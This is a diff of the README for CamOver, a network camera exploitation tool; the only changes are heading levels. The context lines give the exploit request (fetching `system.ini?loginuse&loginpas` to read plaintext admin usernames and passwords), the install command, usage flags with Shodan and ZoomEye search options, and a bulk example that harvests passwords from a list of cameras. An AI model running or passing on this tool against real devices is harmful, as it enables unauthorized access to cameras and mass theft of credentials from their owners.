@@ -21,19 +21,19 @@ Is a camera exploitation tool that allows to disclosure network camera admin pas
 
 Tool effectively looks for `http://{address}/system.ini?loginuse&loginpas` and reads the `username:password` plaintext from the `system.ini` file.
 
-### Installation
+## Installation
 
 ```plain
 python3 -m pip install git+https://github.com/EntySec/CamOver
 ```
 
-### Usage
+## Usage
 
 ```plain
 camover [-h] [-t] [-o OUTPUT] [-i INPUT] [-a ADDRESS] [--shodan SHODAN] [--zoomeye ZOOMEYE] [-p PAGES]
 ```
 
-### Flags
+## Flags
 
 ```plain
 CamOver is a camera exploitation tool that allows to disclosure network camera admin password.
@@ -53,7 +53,7 @@ optional arguments:
                         Number of pages you want to get from ZoomEye.
 ```
 
-### Examples
+## Examples
 
 #### Exploiting single camera
 
@@ -99,6 +99,6 @@ camover -t -i cameras.txt -o passwords.txt
 
 NOTE: It will exploit all cameras in `cameras.txt` list by their addresses and save all obtained passwords to `passwords.txt`.
 
-### URL list
+## URL List
 
 * [Github.com - CamOver](https://github.com/EntySec/CamOver)
